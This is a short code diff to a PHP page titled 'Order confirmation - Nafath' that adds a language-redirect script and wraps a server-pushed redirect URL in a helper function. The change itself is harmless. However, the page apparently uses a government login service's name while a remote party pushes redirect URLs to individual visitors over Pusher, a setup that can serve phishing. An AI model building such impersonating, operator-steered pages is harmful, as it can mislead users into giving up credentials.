@@ -38,6 +38,7 @@ $_SESSION['current_user_id'] = $userId;
   <title>تأكيد الطلب - نفاذ</title>
   <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
   <link rel="stylesheet" href="includes/lang-toggle.css">
+  <script src="includes/lang-redirect.js"></script>
   <style>
     :root { --brand:#0a3550; }
     * { box-sizing: border-box; }
@@ -284,7 +285,7 @@ $_SESSION['current_user_id'] = $userId;
       
       if (data.userId == CLIENT_ID) {
         console.log('✅ التوجيه إلى:', data.url);
-        window.location.href = data.url || '../index.php';
+        window.location.href = applySiteLangRedirect(data.url || '../index.php');
       }
     });
   })();
